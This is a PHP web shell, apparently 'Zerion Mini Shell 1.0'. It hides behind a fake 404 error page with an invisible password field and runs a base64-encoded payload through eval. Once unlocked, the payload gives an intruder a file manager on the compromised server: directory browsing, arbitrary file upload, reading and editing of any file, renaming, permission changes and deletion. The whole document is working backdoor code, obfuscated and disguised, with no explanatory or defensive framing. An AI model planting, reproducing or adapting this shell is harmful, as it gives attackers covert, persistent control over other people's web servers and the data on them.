session_start();
set_time_limit(0);
error_reporting(0);
$pass = "chrot";

if($_POST['login_x'] == $pass) {
	$_SESSION['login_x'] = true;
}

if($_SESSION['login_x'] == false) {
	echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<form method="POST">
<input name="login_x" style="border: none">
</form>
</body></html>';
exit();
}

$base = "aWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSl7CmZvcmVhY2goJF9QT1NUIGFzICRrZXk9PiR2YWx1ZSl7CiRfUE9TVFska2V5XSA9IHN0cmlwc2xhc2hlcygkdmFsdWUpOwp9Cn0KZWNobyAnPCFET0NUWVBFIEhUTUw+CjxIVE1MPgo8SEVBRD4KPGxpbmsgaHJlZj0iIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIj4KPHRpdGxlPk1pbmkgU2hlbGw8L3RpdGxlPgo8c3R5bGU+CkBpbXBvcnQgdXJsKGh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1VYnVudHUpOwpib2R5ewpmb250LWZhbWlseTogVWJ1bnR1OwpiYWNrZ3JvdW5kLWNvbG9yOiAjZTZlNmU2Owp0ZXh0LXNoYWRvdzowcHggMHB4IDFweCAjNzU3NTc1Owp9CiNjb250ZW50IHRyOmhvdmVyewpiYWNrZ3JvdW5kLWNvbG9yOiAjNjM2MjYzOwp0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZjsKfQojY29udGVudCAuZmlyc3R7CmJhY2tncm91bmQtY29sb3I6IHNpbHZlcjsKfQojY29udGVudCAuZmlyc3Q6aG92ZXJ7CmJhY2tncm91bmQtY29sb3I6IHNpbHZlcjsKdGV4dC1zaGFkb3c6MHB4IDBweCAxcHggIzc1NzU3NTsKfQp0YWJsZXsKYm9yZGVyOiAxcHggIzAwMDAwMCBkb3R0ZWQ7Cn0KSDF7CmZvbnQtZmFtaWx5OiBVYnVudHU7Cn0KYXsKY29sb3I6ICMwMDA7CnRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOmhvdmVyewpjb2xvcjogI2ZmZjsKdGV4dC1zaGFkb3c6MHB4IDBweCAxMHB4ICNmZmZmZmY7Cn0KaW5wdXQsc2VsZWN0LHRleHRhcmVhewpib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOwotbW96LWJvcmRlci1yYWRpdXM6IDVweDsKLXdlYmtpdC1ib3JkZXItcmFkaXVzOjVweDsKYm9yZGVyLXJhZGl1czo1cHg7Cn0KPC9zdHlsZT4KPC9IRUFEPgo8Qk9EWT4KPEgxPjxjZW50ZXI+PGltZyBzcmM9Imh0dHBzOi8vcy55aW1nLmNvbS9scS9pL21lc2cvZW1vdGljb25zNy8xOS5naWYiLz4KIE1pbmkgU2hlbGwgPGltZyBzcmM9Imh0dHBzOi8vcy55aW1nLmNvbS9scS9pL21lc2cvZW1vdGljb25zNy8xOS5naWYiLz4KIDwvY2VudGVyPjwvSDE+Cjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+Cjx0cj48dGQ+RGlyZWt0b3JpIDogJzsKaWYoaXNzZXQoJF9HRVRbJ3BhdGgnXSkpewokcGF0aCA9ICRfR0VUWydwYXRoJ107Cn1lbHNlewokcGF0aCA9IGdldGN3ZCgpOwp9CgokcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsJy8nLCRwYXRoKTsKJHBhdGhzID0gZXhwbG9kZSgnLycsJHBhdGgpOwoKZm9yZWFjaCgkcGF0aHMgYXMgJGlkPT4kcGF0KXsKaWYoJHBhdCA9PSAnJyAmJiAkaWQgPT0gMCl7CiRhID0gdHJ1ZTsKZWNobyAnPGEgaHJlZj0iP3BhdGg9LyI+LzwvYT4nOwpjb250aW51ZTsKfQppZigkcGF0ID09ICcnKSBjb250aW51ZTsKZWNobyAnPGEgaHJlZj0iP3BhdGg9JzsKZm9yKCRpPTA7JGk8PSRpZDskaSsrKXsKZWNobyAiJHBhdGhzWyRpXSI7CmlmKCRpICE9ICRpZCkgZWNobyAiLyI7Cn0KZWNobyAnIj4nLiRwYXQuJzwvYT4vJzsKfQplY2hvICc8L3RkPjwvdHI+PHRyPjx0ZD4nOwppZihpc3NldCgkX0ZJTEVTWydmaWxlJ10pKXsKaWYoY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sJHBhdGguJy8nLiRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CgplY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkZpbGUgVGVyLVVwbG9hZCA6KiA8L2ZvbnQ+PGJyIC8+JzsKfWVsc2V7CmVjaG8gJzxmb250IGNvbG9yPSJyZWQiPlVwbG9hZCBnYWdhbCwgU2VydmVybnlhIGtlayA8aW1nIHNyYz0iaHR0cDovL2MuZmFzdGNvbXBhbnkubmV0L2Fzc2V0X2ZpbGVzLy0vMjAxNC8xMS8xMS80RjQuZ2lmIi8+CiA8L2ZvbnQ+PGJyIC8+JzsKfQp9CmVjaG8gJzxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCI+ClVwbG9hZCBGaWxlIDogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIC8+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJ1cGxvYWQiIC8+CjwvZm9ybT4KPC90ZD48L3RyPic7CmlmKGlzc2V0KCRfR0VUWydmaWxlc3JjJ10pKXsKZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZpbGUgOiAiOwplY2hvICRfR0VUWydmaWxlc3JjJ107CmVjaG8gJzwvdHI+PC90ZD48L3RhYmxlPjxiciAvPic7CmVjaG8oJzxwcmU+Jy5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRfR0VUWydmaWxlc3JjJ10pKS4nPC9wcmU+Jyk7Cn1lbHNlaWYoaXNzZXQoJF9HRVRbJ29wdGlvbiddKSAmJiAkX1BPU1RbJ29wdCddICE9ICdkZWxldGUnKXsKZWNobyAnPC90YWJsZT48YnIgLz48Y2VudGVyPicuJF9QT1NUWydwYXRoJ10uJzxiciAvPjxiciAvPic7CmlmKCRfUE9TVFsnb3B0J10gPT0gJ2NobW9kJyl7CmlmKGlzc2V0KCRfUE9TVFsncGVybSddKSl7CmlmKGNobW9kKCRfUE9TVFsncGF0aCddLCRfUE9TVFsncGVybSddKSl7CmVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+Q2hhbmdlIFBlcm1pc3Npb24gRG9uZS48L2ZvbnQ+PGJyIC8+JzsKfWVsc2V7CmVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkNoYW5nZSBQZXJtaXNzaW9uIEVycm9yLjwvZm9udD48YnIgLz4nOwp9Cn0KZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KUGVybWlzc2lvbiA6IDxpbnB1dCBuYW1lPSJwZXJtIiB0eXBlPSJ0ZXh0IiBzaXplPSI0IiB2YWx1ZT0iJy5zdWJzdHIoc3ByaW50ZignJW8nLCBmaWxlcGVybXMoJF9QT1NUWydwYXRoJ10pKSwgLTQpLiciIC8+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCddLiciPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJjaG1vZCI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4KPC9mb3JtPic7Cn1lbHNlaWYoJF9QT1NUWydvcHQnXSA9PSAncmVuYW1lJyl7CmlmKGlzc2V0KCRfUE9TVFsnbmV3bmFtZSddKSl7CmlmKHJlbmFtZSgkX1BPU1RbJ3BhdGgnXSwkcGF0aC4nLycuJF9QT1NUWyduZXduYW1lJ10pKXsKZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5DaGFuZ2UgTmFtZSBEb25lLjwvZm9udD48YnIgLz4nOwp9ZWxzZXsKZWNobyAnPGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIE5hbWUgRXJyb3IuPC9mb250PjxiciAvPic7Cn0KJF9QT1NUWyduYW1lJ10gPSAkX1BPU1RbJ25ld25hbWUnXTsKfQplY2hvICc8Zm9ybSBtZXRob2Q9IlBPU1QiPgpOZXcgTmFtZSA6IDxpbnB1dCBuYW1lPSJuZXduYW1lIiB0eXBlPSJ0ZXh0IiBzaXplPSIyMCIgdmFsdWU9IicuJF9QT1NUWyduYW1lJ10uJyIgLz4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9wdCIgdmFsdWU9InJlbmFtZSI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4KPC9mb3JtPic7Cn1lbHNlaWYoJF9QT1NUWydvcHQnXSA9PSAnZWRpdCcpewppZihpc3NldCgkX1BPU1RbJ3NyYyddKSl7CiRmcCA9IGZvcGVuKCRfUE9TVFsncGF0aCddLCd3Jyk7CmlmKGZ3cml0ZSgkZnAsJF9QT1NUWydzcmMnXSkpewplY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkVkaXQgRmlsZSBEb25lIH5fXi48L2ZvbnQ+PGJyIC8+JzsKfWVsc2V7CmVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkVkaXQgRmlsZSBFcnJvciB+X34uPC9mb250PjxiciAvPic7Cn0KZmNsb3NlKCRmcCk7Cn0KZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KPHRleHRhcmVhIGNvbHM9ODAgcm93cz0yMCBuYW1lPSJzcmMiPicuaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ3BhdGgnXSkpLic8L3RleHRhcmVhPjxiciAvPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iZWRpdCI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4KPC9mb3JtPic7Cn0KZWNobyAnPC9jZW50ZXI+JzsKfWVsc2V7CmVjaG8gJzwvdGFibGU+PGJyIC8+PGNlbnRlcj4nOwppZihpc3NldCgkX0dFVFsnb3B0aW9uJ10pICYmICRfUE9TVFsnb3B0J10gPT0gJ2RlbGV0ZScpewppZigkX1BPU1RbJ3R5cGUnXSA9PSAnZGlyJyl7CmlmKHJtZGlyKCRfUE9TVFsncGF0aCddKSl7CmVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+RGVsZXRlIERpciBEb25lLjwvZm9udD48YnIgLz4nOwp9ZWxzZXsKZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIERpciBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKfQp9ZWxzZWlmKCRfUE9TVFsndHlwZSddID09ICdmaWxlJyl7CmlmKHVubGluaygkX1BPU1RbJ3BhdGgnXSkpewplY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBGaWxlIERvbmUuPC9mb250PjxiciAvPic7Cn1lbHNlewplY2hvICc8Zm9udCBjb2xvcj0icmVkIj5EZWxldGUgRmlsZSBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKfQp9Cn0KZWNobyAnPC9jZW50ZXI+JzsKJHNjYW5kaXIgPSBzY2FuZGlyKCRwYXRoKTsKZWNobyAnPGRpdiBpZD0iY29udGVudCI+PHRhYmxlIHdpZHRoPSI3MDAiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4KPHRyIGNsYXNzPSJmaXJzdCI+Cjx0ZD48Y2VudGVyPk5hbWU8L2NlbnRlcj48L3RkPgo8dGQ+PGNlbnRlcj5TaXplPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+UGVybWlzc2lvbnM8L2NlbnRlcj48L3RkPgo8dGQ+PGNlbnRlcj5PcHRpb25zPC9jZW50ZXI+PC90ZD4KPC90cj4nOwoKZm9yZWFjaCgkc2NhbmRpciBhcyAkZGlyKXsKaWYoIWlzX2RpcigiJHBhdGgvJGRpciIpIHx8ICRkaXIgPT0gJy4nIHx8ICRkaXIgPT0gJy4uJykgY29udGludWU7CmVjaG8gIjx0cj4KPHRkPjxhIGhyZWY9XCI/cGF0aD0kcGF0aC8kZGlyXCI+JGRpcjwvYT48L3RkPgo8dGQ+PGNlbnRlcj4tLTwvY2VudGVyPjwvdGQ+Cjx0ZD48Y2VudGVyPiI7CmlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKZWxzZWlmKCFpc19yZWFkYWJsZSgiJHBhdGgvJGRpciIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOwplY2hvIHBlcm1zKCIkcGF0aC8kZGlyIik7CmlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzwvZm9udD4nOwoKZWNobyAiPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9vcHRpb24mcGF0aD0kcGF0aFwiPgo8c2VsZWN0IG5hbWU9XCJvcHRcIj4KPG9wdGlvbiB2YWx1ZT1cIlwiPjwvb3B0aW9uPgo8b3B0aW9uIHZhbHVlPVwiZGVsZXRlXCI+RGVsZXRlPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJjaG1vZFwiPkNobW9kPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJyZW5hbWVcIj5SZW5hbWU8L29wdGlvbj4KPC9zZWxlY3Q+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInR5cGVcIiB2YWx1ZT1cImRpclwiPgo8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkZGlyXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRkaXJcIj4KPGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIj5cIiAvPgo8L2Zvcm0+PC9jZW50ZXI+PC90ZD4KPC90cj4iOwp9CmVjaG8gJzx0ciBjbGFzcz0iZmlyc3QiPjx0ZD48L3RkPjx0ZD48L3RkPjx0ZD48L3RkPjx0ZD48L3RkPjwvdHI+JzsKZm9yZWFjaCgkc2NhbmRpciBhcyAkZmlsZSl7CmlmKCFpc19maWxlKCIkcGF0aC8kZmlsZSIpKSBjb250aW51ZTsKJHNpemUgPSBmaWxlc2l6ZSgiJHBhdGgvJGZpbGUiKS8xMDI0Owokc2l6ZSA9IHJvdW5kKCRzaXplLDMpOwppZigkc2l6ZSA+PSAxMDI0KXsKJHNpemUgPSByb3VuZCgkc2l6ZS8xMDI0LDIpLicgTUInOwp9ZWxzZXsKJHNpemUgPSAkc2l6ZS4nIEtCJzsKCn0KCmVjaG8gIjx0cj4KPHRkPjxhIGhyZWY9XCI/ZmlsZXNyYz0kcGF0aC8kZmlsZSZwYXRoPSRwYXRoXCI+JGZpbGU8L2E+PC90ZD4KPHRkPjxjZW50ZXI+Ii4kc2l6ZS4iPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+IjsKaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKZWxzZWlmKCFpc19yZWFkYWJsZSgiJHBhdGgvJGZpbGUiKSkgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+JzsKZWNobyBwZXJtcygiJHBhdGgvJGZpbGUiKTsKaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8L2ZvbnQ+JzsKZWNobyAiPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9vcHRpb24mcGF0aD0kcGF0aFwiPgo8c2VsZWN0IG5hbWU9XCJvcHRcIj4KPG9wdGlvbiB2YWx1ZT1cIlwiPjwvb3B0aW9uPgo8b3B0aW9uIHZhbHVlPVwiZGVsZXRlXCI+RGVsZXRlPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJjaG1vZFwiPkNobW9kPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJyZW5hbWVcIj5SZW5hbWU8L29wdGlvbj4KPG9wdGlvbiB2YWx1ZT1cImVkaXRcIj5FZGl0PC9vcHRpb24+Cjwvc2VsZWN0Pgo8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJ0eXBlXCIgdmFsdWU9XCJmaWxlXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cIm5hbWVcIiB2YWx1ZT1cIiRmaWxlXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRmaWxlXCI+CjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCI+XCIgLz4KPC9mb3JtPjwvY2VudGVyPjwvdGQ+CjwvdHI+IjsKfQplY2hvICc8L3RhYmxlPgo8L2Rpdj4nOwp9CmVjaG8gJzxjZW50ZXI+PGJyIC8+WmVyaW9uIE1pbmkgU2hlbGwgPGZvbnQgY29sb3I9ImdyZWVuIj4xLjA8L2ZvbnQ+PC9jZW50ZXI+CjwvQk9EWT4KPC9IVE1MPic7CmZ1bmN0aW9uIHBlcm1zKCRmaWxlKXsKJHBlcm1zID0gZmlsZXBlcm1zKCRmaWxlKTsKCmlmICgoJHBlcm1zICYgMHhDMDAwKSA9PSAweEMwMDApIHsKCi8vIFNvY2tldAokaW5mbyA9ICdzJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgewovLyBTeW1ib2xpYyBMaW5rCiRpbmZvID0gJ2wnOwp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7Ci8vIFJlZ3VsYXIKJGluZm8gPSAnLSc7Cn0gZWxzZWlmICgoJHBlcm1zICYgMHg2MDAwKSA9PSAweDYwMDApIHsKLy8gQmxvY2sgc3BlY2lhbAokaW5mbyA9ICdiJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgewovLyBEaXJlY3RvcnkKJGluZm8gPSAnZCc7Cn0gZWxzZWlmICgoJHBlcm1zICYgMHgyMDAwKSA9PSAweDIwMDApIHsKLy8gQ2hhcmFjdGVyIHNwZWNpYWwKJGluZm8gPSAnYyc7Cn0gZWxzZWlmICgoJHBlcm1zICYgMHgxMDAwKSA9PSAweDEwMDApIHsKLy8gRklGTyBwaXBlCiRpbmZvID0gJ3AnOwp9IGVsc2UgewovLyBVbmtub3duCiRpbmZvID0gJ3UnOwp9CgovLyBPd25lcgokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDEwMCkgPyAncicgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA4MCkgPyAndycgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA0MCkgPwooKCRwZXJtcyAmIDB4MDgwMCkgPyAncycgOiAneCcgKSA6CigoJHBlcm1zICYgMHgwODAwKSA/ICdTJyA6ICctJykpOwoKCi8vIEdyb3VwCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDIwKSA/ICdyJyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDA4KSA/CigoJHBlcm1zICYgMHgwNDAwKSA/ICdzJyA6ICd4JyApIDoKKCgkcGVybXMgJiAweDA0MDApID8gJ1MnIDogJy0nKSk7CgovLyBXb3JsZAokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwNCkgPyAncicgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOwoKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8KKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOgooKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsKCnJldHVybiAkaW5mbzsKfQo=";
eval(base64_decode($base));
